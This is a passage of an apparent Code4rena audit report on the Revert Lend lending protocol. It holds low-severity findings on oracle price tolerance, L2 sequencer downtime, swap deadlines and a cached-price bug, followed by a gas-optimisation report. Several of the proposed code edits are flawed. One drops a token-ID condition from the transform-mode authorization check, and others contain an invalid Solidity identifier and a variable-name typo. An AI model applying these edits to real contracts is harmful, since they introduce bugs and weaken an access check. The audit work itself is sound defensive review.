        if (_maxPoolPriceDifference < MIN_PRICE_DIFFERENCE) {

            revert InvalidConfig();

        }

        maxPoolPriceDifference = _maxPoolPriceDifference;

        emit SetMaxPoolPriceDifference(_maxPoolPriceDifference);

    }
We can see that whenever setting the max pool price difference, it’s checked to not be lower than our MIN_PRICE_DIFFERENCE.

Impact
Confusion in naming conventions leading to hard time of users/developers understanding code.

Recommended Mitigation Steps
Consider renaming the variable and take into account that it’s the minimum max difference between the prices.

kalinbas (Revert) acknowledged and commented:

[01] - This will never reach 0 for a normal token (and this code is already deployed) - so we will leave it.
[02] - Only called by admin so not that important.
[03] - Ok agree.

ronnyx2017 (judge) commented:

[01] - Low.
[02] - Non-Critical.
[03] - Non-Critical.

3 downgraded Lows: #98, #119 and #129.

[04] The logic behind MIN_PRICE_DIFFERENCE is heavily flawed as it allows for heavy arbitraging
Note: At the judge’s request here, this downgraded issue from the same warden has been included in this report for completeness.

The V3Oracle contract defines maxPoolPriceDifference to regulate the maximum price difference allowed between the oracle price and the pool price. This parameter is crucial for maintaining the integrity and reliability of price information used in financial decisions.

Keep in mind that the _maxPoolPriceDifference cannot be set to be lower than the already stored MIN_PRICE_DIFFERENCE

https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Oracle.sol#L190-L196

    function setMaxPoolPriceDifference(uint16 _maxPoolPriceDifference) external onlyOwner {

        if (_maxPoolPriceDifference < MIN_PRICE_DIFFERENCE) {

            revert InvalidConfig();

        }

        maxPoolPriceDifference = _maxPoolPriceDifference;

        emit SetMaxPoolPriceDifference(_maxPoolPriceDifference);

    }
Now initially we can see that maxPoolPriceDifference is set equal to MIN_PRICE_DIFFERENCE which is 200, i.e. 2%.

uint16 public maxPoolPriceDifference = MIN_PRICE_DIFFERENCE; // max price difference between oracle derived price and pool price x10000
Now given that the maximum price difference is set at a value that translates to a 2% tolerance, this threshold may not be stringent enough for protocol and actually causes arbitrageurs to come and heavily game the system. This setting implies that the system could accept and act upon price data that is up to 2% away from the real market price.

For example, Ethereum is set to be reaching $5000 in the coming days, this means that protocol is allowing arbitrageurs to go away with $100 as a spread. Say the current mode is CHAINLINK_TWAP_VERIFY, the twap could return a value 1.9% higher than the real life value and protocol would still integrate with this couple that with the fact that protocol implements leveraging logic and that uniswap oracles which are unreliable on L2s are used. This would lead to a leak of value.

Impact
The V3Oracle contract specifies a maximum allowable price difference between the oracle-derived price and the actual pool price, with a set tolerance of 2% (maxPoolPriceDifference = MIN_PRICE_DIFFERENCE). This threshold is intended to mitigate the risks associated with minor price discrepancies due to market volatility or latency in oracle updates. However, setting this tolerance to 2% is excessive. Such a wide margin for price difference would not only lead to the acceptance of faulty price data, but also a leak of value to the protocol by arbitragers as they can carefully chose their trading decisions to game the system.

Recommended Mitigation Steps
Reconsider the value of MIN_PRICE_DIFFERENCE or atl east introduce a functionality to be able to change the value after deployment of protocol.

Assessed type
Context

kalinbas (Revert) confirmed and commented:

After discussion we think it might be better to remove MIN_PRICE_DIFFERENCE and leave it completely configurable. Changes in Oracle will be made with a Timelock contract anyway, and the risk is that protocol owner could configure a very small value and break borrowing and liquidations (which he could do as well just by setting an invalid TokenConfig).

mariorz (Revert) commented:

While we are indeed removing the MIN_PRICE_DIFFERENCE and wanted to state that in this issue that also pertains to the MIN_PRICE_DIFFERENCE, it is not in any way a confirmation of the validity of this issue.

The issue claims that a 2% setting would lead to economic attacks, yet does not show how that would be executed. We agree with the QA classification.

kalinbas (Revert) commented:

PR here.

Note: For full discussion, see here.

[05] No grace period applied which would then allow positions to be liquidated after sequencer goes down since now users don’t have enough time to deposit funds
Note: At the judge’s request here, this downgraded issue from the same warden has been included in this report for completeness.

Taking a look here, one can see that this function is used to liquidate a position with having a healthy check to ensure that positions being liquidated are actually the ones that are not afloat.

        (state.isHealthy, state.fullValue, state.collateralValue, state.feeValue) =

            _checkLoanIsHealthy(params.tokenId, state.debt);

        if (state.isHealthy) {

            revert NotLiquidatable();

        }
Problem is that protocol has clearly stated that they would deploy to any EVM compatible chain which include different L2s, but no sequencer checks are present in protocol. This leads to a scenario where if the sequencer ever goes down and comes back up users wouldn’t have enough time to get their positions back afloat since all price updates would be immediately consumed after the sequencer comes back up (note that while the sequencer is down users can’t deposit in more capital), this now causes their positions to be immediately unfairly liquidatable.

Impact
Users would be unfairly liquidated since they do not have enough ample time to return their positions back afloat after the sequencer goes off.

Recommended Mitigation Steps
Introduce L2 sequencer checks and provide a grace period for users if the sequencer ever goes down to keep their positions afloat.

Assessed type
Context

Note: For full discussion, see here.

[06] RouterSwapParams lacks a deadlining logic and could lead to unfavourable swaps
Note: At the judge’s request here, this downgraded issue from the same warden has been included in this report for completeness.

The RouterSwapParams struct and the _routerSwap function currently do not include any parameters or logic to enforce a deadline for swap completion. This means there is no built-in mechanism to prevent a swap from occurring if the market conditions change unfavourably after the swap was initiated but before it was executed.

See here:

struct RouterSwapParams {

    IERC20 tokenIn;

    IERC20 tokenOut;

    uint256 amountIn;

    uint256 amountOutMin;

    bytes swapData;

}


function _routerSwap(RouterSwapParams memory params)

    internal

    returns (uint256 amountInDelta, uint256 amountOutDelta)

{

    // Swap logic without deadline enforcement

}
Swaps are executed without considering the time sensitivity of the operation, which is critical in a highly volatile market environment. The absence of a deadline parameter means that once initiated, a swap could theoretically be executed at any point in the future, regardless of how market conditions may have changed. Also note that whereas the slippage logic is already present to protect from returning less than the accepted minimum users could still get affected, take a look at this scenario:

A swap is placed, amountOutMin is 100XYZ tokens, as at the price of 1XYZ = $1, swap stays for long in the mempool (during this period the price of 1XYZ drops to $0.8), so now swap gets finalized, user received 100XYZ tokens, but in reality they’ve lost 20% of their “acceptable” minimum value in dollars.

Impact
The lack of a deadline mechanism in the RouterSwapParams structure can lead to unfavourable outcomes for users, since having a deadline lets the caller specify a deadline parameter that enforces a time limit by which the transaction must be executed. Without a deadline parameter, the transaction may sit in the mempool and be executed at a much later time potentially resulting in a worse price for the user.

Recommended Mitigation Steps
Introduce a deadline parameter to the RouterSwapParams struct and apply it to swaps.

Assessed type
Context

Note: For full discussion, see here.

Improper return of chainlinkReferencePriceX96 in V3Oracle._getReferenceTokenPriceX96()
Submitted by kennedy1030, also found by t4sk.

Note: Since the sponsor team chose to mitigate, this downgraded issue has been included in this report for completeness.

In certain situations, cachedChainlinkReferencePriceX96 cannot prevent the reevaluation of the price of referenceToken in V3Oracle.getValue().

Proof of Concept
In V3Oracle._getReferenceTokenPriceX96() at L278, for the scenario where token = referenceToken, the returned value of chainlinkReferencePriceX96 is 0.

    function _getReferenceTokenPriceX96(address token, uint256 cachedChainlinkReferencePriceX96)

        internal

        view

        returns (uint256 priceX96, uint256 chainlinkReferencePriceX96)

    {

        if (token == referenceToken) {

278         return (Q96, chainlinkReferencePriceX96);

        }


        TokenConfig memory feedConfig = feedConfigs[token];


        if (feedConfig.mode == Mode.NOT_SET) {

            revert NotConfigured();

        }


        uint256 verifyPriceX96;


        bool usesChainlink = (

            feedConfig.mode == Mode.CHAINLINK_TWAP_VERIFY || feedConfig.mode == Mode.TWAP_CHAINLINK_VERIFY

                || feedConfig.mode == Mode.CHAINLINK

        );

        bool usesTWAP = (

            feedConfig.mode == Mode.CHAINLINK_TWAP_VERIFY || feedConfig.mode == Mode.TWAP_CHAINLINK_VERIFY

                || feedConfig.mode == Mode.TWAP

        );


        if (usesChainlink) {

            uint256 chainlinkPriceX96 = _getChainlinkPriceX96(token);

300         chainlinkReferencePriceX96 = cachedChainlinkReferencePriceX96 == 0

                ? _getChainlinkPriceX96(referenceToken)

                : cachedChainlinkReferencePriceX96;


            chainlinkPriceX96 = (10 ** referenceTokenDecimals) * chainlinkPriceX96 * Q96 / chainlinkReferencePriceX96

                / (10 ** feedConfig.tokenDecimals);


            if (feedConfig.mode == Mode.TWAP_CHAINLINK_VERIFY) {

                verifyPriceX96 = chainlinkPriceX96;

            } else {

                priceX96 = chainlinkPriceX96;

            }

        }


        if (usesTWAP) {

            uint256 twapPriceX96 = _getTWAPPriceX96(feedConfig);

            if (feedConfig.mode == Mode.CHAINLINK_TWAP_VERIFY) {

                verifyPriceX96 = twapPriceX96;

            } else {

                priceX96 = twapPriceX96;

            }

        }


        if (feedConfig.mode == Mode.CHAINLINK_TWAP_VERIFY || feedConfig.mode == Mode.TWAP_CHAINLINK_VERIFY) {

            _requireMaxDifference(priceX96, verifyPriceX96, feedConfig.maxDifference);

        }

    }
It sets the value of cachedChainlinkReferencePriceX96 to 0 in V3Oracle.getValue().

    function getValue(uint256 tokenId, address token)

        external

        view

        override

        returns (uint256 value, uint256 feeValue, uint256 price0X96, uint256 price1X96)

    {

        (address token0, address token1, uint24 fee,, uint256 amount0, uint256 amount1, uint256 fees0, uint256 fees1) =

            getPositionBreakdown(tokenId);


        uint256 cachedChainlinkReferencePriceX96;


106     (price0X96, cachedChainlinkReferencePriceX96) =

            _getReferenceTokenPriceX96(token0, cachedChainlinkReferencePriceX96);

108     (price1X96, cachedChainlinkReferencePriceX96) =

            _getReferenceTokenPriceX96(token1, cachedChainlinkReferencePriceX96);


        uint256 priceTokenX96;

        if (token0 == token) {

            priceTokenX96 = price0X96;

        } else if (token1 == token) {

            priceTokenX96 = price1X96;

        } else {

117         (priceTokenX96,) = _getReferenceTokenPriceX96(token, cachedChainlinkReferencePriceX96);

        }


        value = (price0X96 * (amount0 + fees0) / Q96 + price1X96 * (amount1 + fees1) / Q96) * Q96 / priceTokenX96;

        feeValue = (price0X96 * fees0 / Q96 + price1X96 * fees1 / Q96) * Q96 / priceTokenX96;

        price0X96 = price0X96 * Q96 / priceTokenX96;

        price1X96 = price1X96 * Q96 / priceTokenX96;


        // checks derived pool price for price manipulation attacks

        // this prevents manipulations of pool to get distorted proportions of collateral tokens - for borrowing

        // when a pool is in this state, liquidations will be disabled - but arbitrageurs (or liquidator himself)

        // will move price back to reasonable range and enable liquidation

        uint256 derivedPoolPriceX96 = price0X96 * Q96 / price1X96;

        _checkPoolPrice(token0, token1, fee, derivedPoolPriceX96);

    }
In fact, cachedChainlinkReferencePriceX96 is established to prevent the reevaluation of the price of referenceToken in V3Oracle._getReferenceTokenPriceX96() at L300.

However, when token1 = referenceToken in V3Oracle.getValue(), the cachedChainlinkReferencePriceX96 value is set to 0, and it fails to prevent the recalculation in the subsequent call of _getReferenceTokenPriceX96() at L117.

Recommended Mitigation Steps
    function _getReferenceTokenPriceX96(address token, uint256 cachedChainlinkReferencePriceX96)

        internal

        view

        returns (uint256 priceX96, uint256 chainlinkReferencePriceX96)

    {

        if (token == referenceToken) {

-           return (Q96, chainlinkReferencePriceX96);

+           return (Q96, cachedChainlinkReferencePriceX96);

        }


        [...]

    }
kalinbas (Revert) confirmed, but disagreed with severity

ronnyx2017 (judge) decreased severity to QA

Revert mitigated:

Fixed here.

Status: Mitigation Confirmed. Full details in reports from b0g0, thank_you and ktg.

Gas Optimizations
For this audit, 7 reports were submitted by wardens detailing gas optimizations. The report highlighted below by 0x11singh99 received the top score from the judge.

The following wardens also submitted reports: SM3_SS, dharma09, InAllHonesty, SAQ, 0xAnah, and 0xhacksmithh.

[G-01] State variables can be packed into fewer storage slots by reducing their sizes (Instances missed by bot)
The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to each other in storage and this will pack the values together into a single 32 byte storage slot (if values combined are <= 32 bytes). If the variables packed together are retrieved together in functions (more likely with structs), we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a Gwarmaccess (100 gas) versus a Gcoldsload (2100 gas).

SAVE: ~8000 GAS, 4 SLOT.

multiplierPerSecondX96, baseRatePerSecondX96 and jumpMultiplierPerSecondX96 can be packed in single slot by reducing their sizes to uint80 each SAVES: ~4000 Gas, 2 SLOT
All these three variables are set inside only setValues function where a check is implemented for passed function params and then after dividing by YEAR_SECS constant values are assigned into these state variables. It will make sure that multiplierPerSecondX96, baseRatePerSecondX96 and jumpMultiplierPerSecondX96 maximum values can be MAX_MULTIPLIER_X96 / YEAR_SECS, MAX_BASE_RATE_X96 / YEAR_SECS and MAX_MULTIPLIER_X96 / YEAR_SECS respectively not more than that.

Since these constants are defined in same contract. So their approximate values are:

MAX_MULTIPLIER_X96 / YEAR_SECS < 10**22
MAX_BASE_RATE_X96 / YEAR_SECS < 7.5*10**20
While uint80 can hold > ~10**24 So we can easily say that uint80 is sufficient to hold these max values So we can safely reduce the above mentioned storage var. sizes to each uint80 to pack all three into 1 slot and saves 2 storage slots.

File : InterestRateModel.sol


23:    uint256 public multiplierPerSecondX96;

24:    uint256 public baseRatePerSecondX96;

25:    uint256 public jumpMultiplierPerSecondX96;
InterestRateModel.sol#L23-L25

Relevant code to prove why these state variable can be truncated:

File : InterestRateModel.sol


13:  uint256 public constant YEAR_SECS = 31557600; // taking into account leap years

14:

15:  uint256 public constant MAX_BASE_RATE_X96 = Q96 / 10; // 10%

16:  uint256 public constant MAX_MULTIPLIER_X96 = Q96 * 2; // 200%

...

...


82:  function setValues(

         uint256 baseRatePerYearX96,

         uint256 multiplierPerYearX96,

         uint256 jumpMultiplierPerYearX96,

         uint256 _kinkX96

87:     ) public onlyOwner {

88:    if (

89:        baseRatePerYearX96 > MAX_BASE_RATE_X96 || multiplierPerYearX96 > MAX_MULTIPLIER_X96

90:             || jumpMultiplierPerYearX96 > MAX_MULTIPLIER_X96

91:        ) {

92:            revert InvalidConfig();

93:        }

94:

95:  baseRatePerSecondX96 = baseRatePerYearX96 / YEAR_SECS;

96:  multiplierPerSecondX96 = multiplierPerYearX96 / YEAR_SECS;

97:  jumpMultiplierPerSecondX96 = jumpMultiplierPerYearX96 / YEAR_SECS;
InterestRateModel.sol#L13-L16, InterestRateModel.sol#L88-L97

Recommended Mitigation Steps
File : InterestRateModel.sol


-23:    uint256 public multiplierPerSecondX96;

-24:    uint256 public baseRatePerSecondX96;

-25:    uint256 public jumpMultiplierPerSecondX96;

+23:    uint80 public multiplierPerSecondX96;

+24:    uint80 public baseRatePerSecondX96;

+25:    uint80 public jumpMultiplierPerSecondX96;
dailyLendIncreaseLimitLastReset and dailyDebtIncreaseLimitLastReset can be packed with reserveProtectionFactorX32 SAVES: ~4000 Gas, 2 Slot
Since values in these variables are only assigned in _resetDailyLendIncreaseLimit and _resetDailyDebtIncreaseLimit functions respectively with the value of block.timestamp/1 Days for both. So it is sufficient to hold these values in uint32. Reduce those variable sizes to uint32 each and pack with reserveProtectionFactorX32. Saves 2 storage slots.

File : V3Vault.sol



121: uint32 public reserveProtectionFactorX32 = MIN_RESERVE_PROTECTION_FACTOR_X32;

...

...

140: uint256 public dailyLendIncreaseLimitLastReset = 0;

...

145: uint256 public dailyDebtIncreaseLimitLastReset = 0;
V3Vault.sol#L121, V3Vault.sol#L140-L145

Recommended Mitigation Steps
File : V3Vault.sol



121: uint32 public reserveProtectionFactorX32 = MIN_RESERVE_PROTECTION_FACTOR_X32;

+140: uint32 public dailyLendIncreaseLimitLastReset = 0;

+145: uint32 public dailyDebtIncreaseLimitLastReset = 0;

...

...

-140: uint256 public dailyLendIncreaseLimitLastReset = 0;

...

-145: uint256 public dailyDebtIncreaseLimitLastReset = 0;
[G-02] State variable can be packed into fewer storage slots by truncating timestamp
The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to each other in storage and this will pack the values together into a single 32 byte storage slot (if values combined are <= 32 bytes). If the variables packed together are retrieved together in functions (more likely with structs), we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a Gwarmaccess (100 gas) versus a Gcoldsload (2100 gas).

Truncate uint256 lastExchangeRateUpdate to uint64 and can be packed with address emergencyAdmin
lastExchangeRateUpdate can safely be truncated to uint64 since it holds timestamp. uint64 is much more sufficient to hold realistic time. It can also save 1 storage slot.

A uint64 data type can represent values from 0 to 18,446,744,073,709,551,615. To convert this range into years, we need to define the unit of time being represented.

If we consider seconds then: 1 year = 31,536,000 seconds.

So the maximum value a uint64 can represent in years is:

18,446,744,073,709,551,615 seconds / 31,536,000 seconds per year ≈ 584,942,417 years.

This is an astronomically large value and far exceeds any practical use case in most software applications including smart contracts. Therefore, for most practical purposes a uint64 range is sufficient for representing time durations in years.

File : V3Vault.sol


127:  uint256 public lastExchangeRateUpdate = 0;

...

167:  address public emergencyAdmin;
V3Vault.sol#L127, V3Vault.sol#L167

Recommended Mitigation Steps
File : V3Vault.sol


-127:  uint256 public lastExchangeRateUpdate = 0;

...

167:  address public emergencyAdmin;

+127:  uint64 public lastExchangeRateUpdate = 0;
[G-03] Pack the struct variables into fewer storage slots by re-ordering the variables
Saves: ~2000 Gas

To pack the struct efficiently you can rearrange the storage variables to minimize padding between variables. This optimization can help save gas costs by reducing the number of storage slots used.

Below recommended optimization can be made to this struct to save 1 storage slot per key in the mapping where this TokenConfig struct used.

*Note: I have tested this by adding test variable of TokenConfig type and run forge command forge inspect src/V3Oracle.sol:V3Oracle storage --pretty for both struct Optimized and Un-optimized. Unoptimized will take 3 storage slots while optimized one will take only 2 storage slots.

File : V3Oracle.sol


43:  struct TokenConfig {

44:     AggregatorV3Interface feed; // chainlink feed

45:     uint32 maxFeedAge;

46:     uint8 feedDecimals;

47:     uint8 tokenDecimals;

48:     IUniswapV3Pool pool; // reference pool

49:     bool isToken0;

50:     uint32 twapSeconds;

51:     Mode mode;

52:     uint16 maxDifference; // max price difference x10000

53: }
V3Oracle.sol#L43-L53

Recommended Mitigation Steps
File : V3Oracle.sol


43:  struct TokenConfig {

44:     AggregatorV3Interface feed; // chainlink feed

45:     uint32 maxFeedAge;

46:     uint8 feedDecimals;

47:     uint8 tokenDecimals;

+50:     uint32 twapSeconds;

48:     IUniswapV3Pool pool; // reference pool

49:     bool isToken0;

-50:     uint32 twapSeconds;

51:     Mode mode;

52:     uint16 maxDifference; // max price difference x10000

53: }
[G-04] Refactor borrow function to avoid 1 sload
Since transformedTokenId == tokenId, check that both should be equal. We can use tokenId instead of transformedTokenId and check tokenId for 0 and also, we don’t have check the second condition we can remove transformedTokenId == tokenId in this check.

File : V3Vault.sol


550: function borrow(uint256 tokenId, uint256 assets) external override {

551:      bool isTransformMode =

552:       transformedTokenId > 0 && transformedTokenId == tokenId && transformerAllowList[msg.sender];
V3Vault.sol#L550-L552

Recommended Mitigation Steps
File : V3Vault.sol


550: function borrow(uint256 tokenId, uint256 assets) external override {

551:      bool isTransformMode =

-552:       transformedTokenId > 0 && transformedTokenId == tokenId && transformerAllowList[msg.sender];

+552:       tokenId > 0 && transformerAllowList[msg.sender];
[G-05] Refactor configToken function to fail early and saves 1 external call on failing
To refactor the configToken function to fail early and save one external call on failing condition. You can move the check for config.isActive and the subsequent check for config.token0TriggerTick >= config.token1TriggerTick up before the external call to nonfungiblePositionManager.ownerOf(tokenId). This way if any of the conditions fail the function will revert before making the external call.

File : automators/AutoExit.sol


218:    function configToken(uint256 tokenId, PositionConfig calldata config) external {

219:        address owner = nonfungiblePositionManager.ownerOf(tokenId);

220:        if (owner != msg.sender) {

221:            revert Unauthorized();

222:        }

223:

224:        if (config.isActive) {

225:            if (config.token0TriggerTick >= config.token1TriggerTick) {

226:                revert InvalidConfig();

227:            }

228:        }
AutoExit.sol#L218-L228

Recommended Mitigation Steps
File : automators/AutoExit.sol


218:    function configToken(uint256 tokenId, PositionConfig calldata config) external {

+224:        if (config.isActive) {

+225:            if (config.token0TriggerTick >= config.token1TriggerTick) {

+226:                revert InvalidConfig();

+227:            }

+228:        }


219:        address owner = nonfungiblePositionManager.ownerOf(tokenId);

220:        if (owner != msg.sender) {

221:            revert Unauthorized();

222:        }

223:

-224:        if (config.isActive) {

-225:            if (config.token0TriggerTick >= config.token1TriggerTick) {

-226:                revert InvalidConfig();

-227:            }

-228:        }
[G-06] Cache state variable outside of the else block to save 1 sload
Cache transformedTokenId outside of the else block saves 1 sload (~100 gas) on above if statement false.

File : V3Vault.sol


441: if (transformedTokenId == 0) {

...

450:     } else {

451:          uint256 oldTokenId = transformedTokenId;
V3Vault.sol#L441-L451

Recommended Mitigation Steps
File : V3Vault.sol


+451:          uint256 oldTokenId = transformedTokenId;

441: if (transformedTokenId == 0) {

...

450:     } else {

-451:          uint256 oldTokenId = transformedTokenId;
[G-07] Use direct global msg.sender instead of taking it as function parameter
Use directly msg.sender instead of taking it as owner function parameter.

File : V3Vault.sol


410:    function createWithPermit(

411:        uint256 tokenId,

412:        address owner,

413:        address recipient,

414:        uint256 deadline,

415:        uint8 v,

416:        bytes32 r,

417:        bytes32 s

418:    ) external override {

419:        if (msg.sender != owner) {

420:            revert Unauthorized();

421:        }

422:

423:        nonfungiblePositionManager.permit(address(this), tokenId, deadline, v, r, s);

424:        nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(recipient));

425:    }
V3Vault.sol#L410-L425

Recommended Mitigation Steps
File : V3Vault.sol


410:    function createWithPermit(

411:        uint256 tokenId,

-412:        address owner,

413:        address recipient,

414:        uint256 deadline,

415:        uint8 v,

416:        bytes32 r,

417:        bytes32 s

418:    ) external override {

-419:        if (msg.sender != owner) {

-420:            revert Unauthorized();

-421:        }

422:

423:        nonfungiblePositionManager.permit(address(this), tokenId, deadline, v, r, s);

-424:        nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(recipient));

+424:        nonfungiblePositionManager.safeTransferFrom(msg.sender, address(this), tokenId, abi.encode(recipient));

425:    }
[G-08] Cache calculations instead of re-calculating. Saves 3 checked subtractions.
Instance 1
Cache block.timestamp - lastRateUpdate to save 1 checked subtraction.

File : V3Vault.sol


1188:    + oldDebtExchangeRateX96 * (block.timestamp - lastRateUpdate) * borrowRateX96 / Q96;

1189:         newLendExchangeRateX96 = oldLendExchangeRateX96

1190:            + oldLendExchangeRateX96 * (block.timestamp - lastRateUpdate) * supplyRateX96 / Q96;
V3Vault.sol#L1188-L1190

Recommended Mitigation Steps
File : V3Vault.sol


+         uint256 block.timestampSUBlastRateUpdate = block.timestamp - lastRateUpdate;


-1188:    + oldDebtExchangeRateX96 * (block.timestamp - lastRateUpdate) * borrowRateX96 / Q96;

+1188:    + oldDebtExchangeRateX96 * (block.timestampSUBlastRateUpdate) * borrowRateX96 / Q96;

1189:         newLendExchangeRateX96 = oldLendExchangeRateX96

-1190:            + oldLendExchangeRateX96 * (block.timestamp - lastRateUpdate) * supplyRateX96 / Q96;

+1190:            + oldLendExchangeRateX96 * (block.timestampSUBlastRateUpdate) * supplyRateX96 / Q96;
Instance 2
Cache SafeCast.toUint192(oldShares - newShares) and SafeCast.toUint192(newShares - oldShares) can save 2 checked subtractions.

File : V3Vault.sol



1216:  if (oldShares > newShares) {

1217:      tokenConfigs[token0].totalDebtShares -= SafeCast.toUint192(oldShares - newShares);

1218:      tokenConfigs[token1].totalDebtShares -= SafeCast.toUint192(oldShares - newShares);

1219:  } else {

1220:      tokenConfigs[token0].totalDebtShares += SafeCast.toUint192(newShares - oldShares);

1221:      tokenConfigs[token1].totalDebtShares += SafeCast.toUint192(newShares - oldShares);
V3Vault.sol#L1216-L1221

Recommended Mitigation Steps
File : V3Vault.sol


1216:  if (oldShares > newShares) {

+         uint192 safecast_to192_oldShares = SafeCast.toUint192(oldShares - newShares);

-1217:      tokenConfigs[token0].totalDebtShares -= SafeCast.toUint192(oldShares - newShares);

-1218:      tokenConfigs[token1].totalDebtShares -= SafeCast.toUint192(oldShares - newShares);

+1217:      tokenConfigs[token0].totalDebtShares -= safecast_to192_oldShares;

+1218:      tokenConfigs[token1].totalDebtShares -= safecast_to192_oldShares;

1219:  } else {

+         uint192 safecast_to192_newshares = SafeCast.toUint192(newShares - oldShares);

-1220:      tokenConfigs[token0].totalDebtShares += SafeCast.toUint192(newShares - oldShares);

-1221:      tokenConfigs[token1].totalDebtShares += SafeCast.toUint192(newShares - oldShares);

+1220:      tokenConfigs[token0].totalDebtShares += safecast_to192_newshares;

+1221:      tokenConfigs[token1].totalDebtShares += safecast_to192_newshares;
[G-09] Struct can be packed into fewer storage slot by truncating time
deadline, rewardX64 and liquidity can be packed in a single slot.
SAVES: 4000 Gas, 2 Slots

You can pack the ExecuteParams struct into fewer storage slots by truncating the deadline to a smaller data type such as uint64. deadline can be represented within this range.

A uint64 data type can represent values from 0 to 18,446,744,073,709,551,615. To convert this range into years we need to define the unit of time being represented.

If we consider seconds then: 1 year = 31,536,000 seconds.

So the maximum value a uint64 can represent in years is:

18,446,744,073,709,551,615 seconds / 31,536,000 seconds per year ≈ 584,942,417 years.

This is an astronomically large value and far exceeds any practical use case in most software applications including smart contracts. Therefore, for most practical purposes a uint64 range is sufficient for representing time durations in years.

File : automators/AutoExit.sol


63:    struct ExecuteParams {

64:        uint256 tokenId; // tokenid to process

65:        bytes swapData; // if its a swap order - must include swap data

66:        uint128 liquidity; // liquidity the calculations are based on

67:        uint256 amountRemoveMin0; // min amount to be removed from liquidity

68:        uint256 amountRemoveMin1; // min amount to be removed from liquidity

69:        uint256 deadline; // for uniswap operations - operator promises fair value

70:        uint64 rewardX64; // which reward will be used for protocol, can be max configured amount (considering onlyFees)

71:    }
AutoExit.sol#L63-L71

Recommended Mitigation Steps
File : automators/AutoExit.sol


63:    struct ExecuteParams {

64:        uint256 tokenId; // tokenid to process

65:        bytes swapData; // if its a swap order - must include swap data

-66:        uint128 liquidity; // liquidity the calculations are based on

67:        uint256 amountRemoveMin0; // min amount to be removed from liquidity

68:        uint256 amountRemoveMin1; // min amount to be removed from liquidity

-69:        uint256 deadline; // for uniswap operations - operator promises fair value

+69:        uint64 deadline; // for uniswap operations - operator promises fair value

70:        uint64 rewardX64; // which reward will be used for protocol, can be max configured amount (considering onlyFees)

+66:        uint128 liquidity; // liquidity the calculations are based on

71:    }
[G-10] Make calculation constant instead of calculating every time on function call
Mark Q96 * Q64 constant saves 1 checked multiplication
You can make the calculation involving Q96 * Q64 constant. This will avoid recalculating the result every time the function is called saving 1 checked multiplication.

File : automators/Automator.sol


158:  amountOutMin = FullMath.mulDiv(amountIn * (Q64 - maxPriceDifferenceX64), priceX96, Q96 * Q64);
Automator.sol#L158

Recommended Mitigation Steps
File : automators/Automator.sol


+  // Define Q96_TIMES_Q64 as a constant

+  uint256 constant Q96_TIMES_Q64 = Q96 * Q64;


-158:  amountOutMin = FullMath.mulDiv(amountIn * (Q64 - maxPriceDifferenceX64), priceX96, Q96 * Q64);

+158:  amountOutMin = FullMath.mulDiv(amountIn * (Q64 - maxPriceDifferenceX64), priceX96, Q96_TIMES_Q64);
Make Q32 + MAX_DAILY_LEND_INCREASE_X32 constant save (~180 Gas)
File : V3Vault.sol


1251: * (Q32 + MAX_DAILY_LEND_INCREASE_X32) / Q32;
V3Vault.sol#L1251

Recommended Mitigation Steps
File : V3Vault.sol


+  uint256 constant Q32PlusMAX_DAILY_LEND_INCREASE_X32 = Q32 + MAX_DAILY_LEND_INCREASE_X32;


-1251: * (Q32 + MAX_DAILY_LEND_INCREASE_X32) / Q32;

+1251: * (Q32PlusMAX_DAILY_LEND_INCREASE_X32) / Q32;
[G-11] Check before updating bool with same value
Instance 1
Lack of a check could potentially result in unnecessary state changes and gas costs if the _active value passed to the function is the same as the current value stored in the operators mapping.

Adding a simple check to compare the new _active value with the current value stored in the mapping before updating it could optimize gas usage and prevent unnecessary state changes.

File : automators/Automator.sol


69:   function setOperator(address _operator, bool _active) public onlyOwner {

70:       emit OperatorChanged(_operator, _active);

71:        operators[_operator] = _active;

72:    }
Automator.sol#L69-L72

Recommended Mitigation Steps
File : automators/Automator.sol


69:   function setOperator(address _operator, bool _active) public onlyOwner {

+       if (operators[_operator] != _active) {

70:       emit OperatorChanged(_operator, _active);

71:        operators[_operator] = _active;

+         }

72:    }
Instance 2
As with the previous Instance 1 there is no explicit check to determine whether the _active value being set is different from the current value stored in the vaults mapping for the given _vault address. This lack of a check could result in unnecessary state changes and gas costs if the _active value passed to the function is the same as the current value stored in the mapping.

File : automators/Automator.sol


79:    function setVault(address _vault, bool _active) public onlyOwner {

80:      emit VaultChanged(_vault, _active);

81:       vaults[_vault] = _active;

82:    }
Automator.sol#L79-L82

Recommended Mitigation Steps
File : automators/Automator.sol


79:    function setVault(address _vault, bool _active) public onlyOwner {

+       if (vaults[_vaults] != _active) {

80:      emit VaultChanged(_vault, _active);

81:       vaults[_vault] = _active;

+        }

82:    }
[G-12] Switch the order around && to use shortcircuit to save gas (Instances missed by bot)
Instance 1
You can switch the order of conditions in the if statement to utilize short-circuit evaluation. This ensures that if the first condition (unwrap) is false the second condition (address(weth) == address(token)) won’t even be evaluated.

File : automators/Automator.sol


219:  if (address(weth) == address(token) && unwrap) {
Automator.sol#L219

Recommended Mitigation Steps
File : automators/Automator.sol


-219:  if (address(weth) == address(token) && unwrap) {

+219:  if (unwrap && address(weth) == address(token)) {
[G-13] No need to cache a function call if used only once
Instance 1
No need to cache params.tokenIn.balanceOf(address(this)) and params.tokenOut.balanceOf(address(this)) in stack variable in balanceInAfter and balanceOutAfter respectively, since they are used only once.

File  : utils/Swapper.sol


104:   uint256 balanceInAfter = params.tokenIn.balanceOf(address(this));

105:   uint256 balanceOutAfter = params.tokenOut.balanceOf(address(this));

...

107:   amountInDelta = balanceInBefore - balanceInAfter;

108:   amountOutDelta = balanceOutAfter - balanceOutBefore;
Swapper.sol#L104-L108

Recommended Mitigation Steps
File  : utils/Swapper.sol


-104:   uint256 balanceInAfter = params.tokenIn.balanceOf(address(this));

-105:   uint256 balanceOutAfter = params.tokenOut.balanceOf(address(this));

...

-107:   amountInDelta = balanceInBefore - balanceInAfter;

-108:   amountOutDelta = balanceOutAfter - balanceOutBefore;

+107:   amountInDelta = balanceInBefore - params.tokenIn.balanceOf(address(this));

+108:   amountOutDelta = params.tokenOut.balanceOf(address(this)) - balanceOutBefore;
Instance 2
